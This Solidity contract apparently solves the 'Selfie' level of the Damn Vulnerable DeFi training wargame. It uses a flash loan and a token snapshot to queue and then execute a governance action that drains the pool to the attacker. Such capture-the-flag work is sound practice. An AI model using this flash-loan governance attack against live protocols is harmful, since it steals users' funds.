pragma solidity ^0.8.0;

import "./SelfiePool.sol";
import "./SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";

import "hardhat/console.sol";

contract AaronVoter {
    ERC20Snapshot token;
    DamnValuableTokenSnapshot token2;
    SimpleGovernance pool;
    SelfiePool loaner;

    uint256 actionId;
    uint256 amount;

    constructor(address _token, address _pool, address _loaner, uint256 _amount) {
        token = ERC20Snapshot(_token);
        pool = SimpleGovernance(_pool);
        loaner = SelfiePool(_loaner);
        amount = _amount;
    }

    receive() payable external {}

    function receiveTokens(address _token2, uint256 _amount) public {
        token2 = DamnValuableTokenSnapshot(_token2);
        console.log("receiveFlashLoan(): balance=%s / amount=%s", token2.balanceOf(address(this)), _amount);
        token2.snapshot();
        console.log("... queue action");

        actionId = pool.queueAction(address(loaner), abi.encodeWithSignature(
            "drainAllFunds(address)",
            address(this)
        ), 0);

        console.log("... actionId: %s", actionId);
        console.log("... returning tokens");
        token2.transfer(address(loaner), _amount);
        console.log("... finished receiveFlashLoan");

    }

    function pwn() external {
        console.log("Request amount: %s", amount);
        loaner.flashLoan(amount);
    }

    function pwn2() external {
        console.log("Executing actionId=%s", actionId);
        pool.executeAction(actionId);
        console.log("Final token balance: %s", token2.balanceOf(address(this)));
        token.transfer(address(msg.sender), token.balanceOf(address(this)));
        console.log("Finished");
    }
}
